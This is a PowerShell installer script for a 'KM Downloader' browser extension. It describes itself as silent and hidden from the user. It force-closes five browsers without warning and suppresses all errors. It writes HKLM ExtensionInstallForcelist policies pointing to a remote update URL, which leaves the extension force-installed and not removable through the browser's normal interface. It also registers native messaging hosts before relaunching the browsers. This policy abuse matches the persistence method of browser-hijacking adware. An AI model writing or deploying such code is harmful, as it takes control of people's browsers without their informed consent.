#Requires -RunAsAdministrator

# ============================================================
#  KM Downloader — Browser Extension Installer (PowerShell)
#  Silent mode - Completely hidden from user
# ============================================================

$UPDATE_URL = "https://kerolesmounir6-sys.github.io/km-downloader-extension/update.xml"
$EXT_ID     = "ceojdhgfbcnbfdipehfdfalmcpjjnglg"
$NMH_PATH   = "$env:ProgramFiles\KM Downloader\com.km.downloader.json"

$BROWSERS = @(
    @{ Name = "Chrome";  PolicyKey = "HKLM:\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist"; NMHKey = "HKLM:\SOFTWARE\Google\Chrome\NativeMessagingHosts\com.km.downloader"; Process = "chrome.exe"; ExtPage = "chrome://extensions" }
    @{ Name = "Edge";    PolicyKey = "HKLM:\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist"; NMHKey = "HKLM:\SOFTWARE\Microsoft\Edge\NativeMessagingHosts\com.km.downloader"; Process = "msedge.exe"; ExtPage = "edge://extensions" }
    @{ Name = "Brave";   PolicyKey = "HKLM:\SOFTWARE\Policies\BraveSoftware\Brave\ExtensionInstallForcelist"; NMHKey = "HKLM:\SOFTWARE\BraveSoftware\Brave\NativeMessagingHosts\com.km.downloader"; Process = "brave.exe"; ExtPage = "brave://extensions" }
    @{ Name = "Vivaldi"; PolicyKey = "HKLM:\SOFTWARE\Policies\Vivaldi\ExtensionInstallForcelist"; NMHKey = "HKLM:\SOFTWARE\Vivaldi\NativeMessagingHosts\com.km.downloader"; Process = "vivaldi.exe"; ExtPage = "vivaldi://extensions" }
    @{ Name = "Opera";   PolicyKey = "HKLM:\SOFTWARE\Policies\Opera Software\Opera\ExtensionInstallForcelist"; NMHKey = "HKLM:\SOFTWARE\Opera Software\Opera\NativeMessagingHosts\com.km.downloader"; Process = "opera.exe"; ExtPage = "opera://extensions" }
)

# ── Silent mode: Hide PowerShell window ──
$ErrorActionPreference = "SilentlyContinue"

# Hide console window
$null = [System.Reflection.Assembly]::LoadWithPartialName("System.windows.forms")

# ── Step 1: Kill all running browsers ──
foreach ($b in $BROWSERS) {
    Stop-Process -Name ($b.Process -replace '\.exe$', '') -Force -ErrorAction SilentlyContinue
}

Start-Sleep -Seconds 1

# ── Step 2: ExtensionInstallForcelist ──
$successCount = 0
foreach ($b in $BROWSERS) {
    $path = $b.PolicyKey
    try {
        $null = New-Item -Path $path -Force -ErrorAction Stop
        $null = New-ItemProperty -Path $path -Name "1" -Value "$($EXT_ID);$($UPDATE_URL)" -PropertyType String -Force -ErrorAction Stop
        $successCount++
    } catch { }
}

# ── Step 3: Native Messaging Hosts ──
foreach ($b in $BROWSERS) {
    $path = $b.NMHKey
    try {
        $null = New-Item -Path $path -Force -ErrorAction Stop
        $null = New-ItemProperty -Path $path -Name "(default)" -Value $NMH_PATH -PropertyType String -Force -ErrorAction Stop
    } catch { }
}

# ── Step 4: Auto-restart browsers ──
$toRestart = @()
foreach ($b in $BROWSERS) {
    $path = $b.PolicyKey
    if (Test-Path $path) {
        $toRestart += $b
    }
}

Start-Sleep -Seconds 2

foreach ($b in $toRestart) {
    Start-Process $b.Process -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 1
}

# ── Show completion message (simple popup) ──
if ($successCount -gt 0) {
    Start-Sleep -Seconds 3
    
    # Create popup using Windows Forms
    [System.Reflection.Assembly]::LoadWithPartialName("System.windows.forms") | Out-Null
    
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "KM Downloader Setup"
    $form.Width = 400
    $form.Height = 200
    $form.StartPosition = "CenterScreen"
    $form.TopMost = $true
    $form.FormBorderStyle = "FixedDialog"
    $form.MaximizeBox = $false
    $form.MinimizeBox = $false
    $form.ControlBox = $false
    $form.ShowIcon = $false
    
    # Background color
    $form.BackColor = [System.Drawing.Color]::White
    
    # Title label
    $titleLabel = New-Object System.Windows.Forms.Label
    $titleLabel.Text = "Installation Complete"
    $titleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 16, [System.Drawing.FontStyle]::Bold)
    $titleLabel.TextAlign = "MiddleCenter"
    $titleLabel.Location = New-Object System.Drawing.Point(10, 30)
    $titleLabel.Size = New-Object System.Drawing.Size(380, 40)
    $titleLabel.ForeColor = [System.Drawing.Color]::FromArgb(34, 139, 34)
    $form.Controls.Add($titleLabel)
    
    # Message label
    $messageLabel = New-Object System.Windows.Forms.Label
    $messageLabel.Text = "The extension has been successfully installed.`r`nYour browser will open shortly."
    $messageLabel.Font = New-Object System.Drawing.Font("Segoe UI", 11)
    $messageLabel.TextAlign = "MiddleCenter"
    $messageLabel.Location = New-Object System.Drawing.Point(10, 75)
    $messageLabel.Size = New-Object System.Drawing.Size(380, 60)
    $messageLabel.ForeColor = [System.Drawing.Color]::FromArgb(80, 80, 80)
    $form.Controls.Add($messageLabel)
    
    # Finish button
    $finishButton = New-Object System.Windows.Forms.Button
    $finishButton.Text = "Finish"
    $finishButton.Font = New-Object System.Drawing.Font("Segoe UI", 11, [System.Drawing.FontStyle]::Bold)
    $finishButton.Location = New-Object System.Drawing.Point(150, 150)
    $finishButton.Size = New-Object System.Drawing.Size(100, 35)
    $finishButton.BackColor = [System.Drawing.Color]::FromArgb(66, 133, 244)
    $finishButton.ForeColor = [System.Drawing.Color]::White
    $finishButton.Cursor = "Hand"
    $finishButton.FlatStyle = "Flat"
    $finishButton.FlatAppearance.BorderSize = 0
    $finishButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
    $finishButton.Add_Click({ $form.Close() })
    $form.Controls.Add($finishButton)
    
    # Hover effect
    $finishButton.Add_MouseEnter({
        $finishButton.BackColor = [System.Drawing.Color]::FromArgb(50, 110, 220)
    })
    $finishButton.Add_MouseLeave({
        $finishButton.BackColor = [System.Drawing.Color]::FromArgb(66, 133, 244)
    })
    
    $form.ShowDialog() | Out-Null
}

# ── Open extensions page ──
if ($toRestart.Count -gt 0) {
    Start-Sleep -Seconds 1
    if ($toRestart[0].Name -eq "Chrome") {
        Start-Process "chrome.exe" -ArgumentList "chrome://extensions" -ErrorAction SilentlyContinue
    } elseif ($toRestart[0].Name -eq "Edge") {
        Start-Process "msedge.exe" -ArgumentList "edge://extensions" -ErrorAction SilentlyContinue
    } elseif ($toRestart[0].Name -eq "Brave") {
        Start-Process "brave.exe" -ArgumentList "brave://extensions" -ErrorAction SilentlyContinue
    }
}

# Exit silently
Exit
